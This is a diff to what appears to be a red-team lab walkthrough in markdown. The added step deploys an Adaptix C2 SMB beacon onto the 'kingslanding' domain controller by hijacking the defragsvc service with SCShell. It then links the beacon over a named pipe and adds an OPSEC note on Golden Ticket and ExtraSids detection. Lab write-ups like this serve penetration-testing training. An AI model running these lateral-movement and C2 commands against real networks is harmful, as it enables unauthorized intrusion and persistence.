@@ -1626,9 +1626,6 @@ upload /local/path/to/http_x64.exe \\kingslanding.sevenkingdoms.local\ADMIN$\htt
 
 ![](image/red-team-workflow/20260922160121.png)
 
-> The SMB beacon would have been the best and realistic option for this, however [Kharon](https://github.com/entropy-z/Kharon) Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run link smb <target_ip> <pipe_name> right after the command below to connect to the SMB beacon.
-
-
 ```
 invoke scshell kingslanding.sevenkingdoms.local defragsvc "C:\Windows\http_x64.exe"
 ```
@@ -1646,6 +1643,18 @@ jump scshell kingslanding.sevenkingdoms.local /path/to/http_x64.exe -n defragsvc
 ![](image/red-team-workflow/20260922160516.png)
 
 ![](image/red-team-workflow/20260922160527.png)
+
+Step 3c - Default Adaptix SMB beacon with pipe link:
+
+```
+jump scshell kingslanding.sevenkingdoms.local /home/stillbigjosh/Downloads/svc_smb_x64.exe -n defragsvc
+```
+
+```
+link smb 10.1.10.11 TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57
+```
+
+![SMB beacon linked on kingslanding](writeups/images/red-team-workflow/20260923175936.png)
 
 **OPSEC Warning:** Golden Ticket usage generates Event 4769 with potentially anomalous ticket lifetimes. ExtraSids specifically triggers SID filtering checks if inter-forest (but not intra-forest child-to-parent).
 
